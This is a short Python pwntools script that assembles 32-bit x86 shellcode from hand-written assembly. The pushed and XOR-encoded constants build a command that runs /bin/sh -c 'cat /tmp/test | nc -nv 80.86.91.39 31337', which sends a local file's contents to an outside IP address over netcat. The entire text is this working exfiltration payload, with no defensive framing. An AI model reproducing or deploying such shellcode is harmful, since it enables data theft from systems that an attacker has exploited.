from pwn import *
payload="""
    mov     ebp, esp
    push 0x1010101
    xor dword ptr [esp], 0x169722e
    push 0x6e69622f
    push 0x1010101
    xor dword ptr [esp], 0x101622c
    push 0x1010101
    xor dword ptr [esp], 0x1013632
    push 0x33313320
    push 0x39332e31
    push 0x392e3638
    push 0x2e303820
    push 0x766e2d20
    push 0x636e2f6e
    push 0x69622f20
    push 0x7c207473
    push 0x65742f70
    push 0x6d742f20
    push 0x7461632f
    push 0x6e69622f

    lea eax, [ebp-0x8]
    lea ebx, [ebp-0xc]
    lea ecx, [ebp-0x40]  
    push 0    
    push ecx
    push ebx
    push eax

    push 0xdeadbeef
    lea  eax, [esp+4]
    mov  [esp], eax
    mov  eax, 11
    mov  ebx, [esp+4]
    mov  ecx, [esp]
    mov  edx, 0
    int  0x80
"""
shellcode=asm(payload)

